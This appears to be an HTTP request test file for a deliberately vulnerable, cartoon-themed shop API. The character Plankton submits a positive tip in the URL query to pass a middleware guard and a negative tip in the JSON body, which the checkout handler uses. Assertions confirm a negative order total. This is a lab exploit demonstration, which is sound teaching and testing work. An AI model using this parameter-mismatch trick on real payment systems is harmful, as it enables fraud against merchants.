# @import ../common/setup.http
@base = {{base_host}}/v104

### Plankton prepares a cart
# @name cart
POST {{base}}/cart
Authorization: {{sandy_auth}}

POST {{base}}/cart/{{cart.response.body.cart_id}}/items
Authorization: {{sandy_auth}}
Content-Type: application/json

{ "item_id": "2" }

### Exploit: Plankton tricks the "No Negative Tips" guard
# He puts a positive tip in the URL (Query) to satisfy the middleware check.
# But he puts a NEGATIVE tip in the JSON Body, which the checkout handler actually uses.
# @name exploit
POST {{base}}/cart/{{cart.response.body.cart_id}}/checkout?tip=20
Authorization: {{sandy_auth}}
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "Chum Bucket"
}

# Verification: The system accepted the negative tip, effectively paying Plankton $50.
?? status == 201
?? body.tip == "-50.00"
?? body.total == "-44.00"
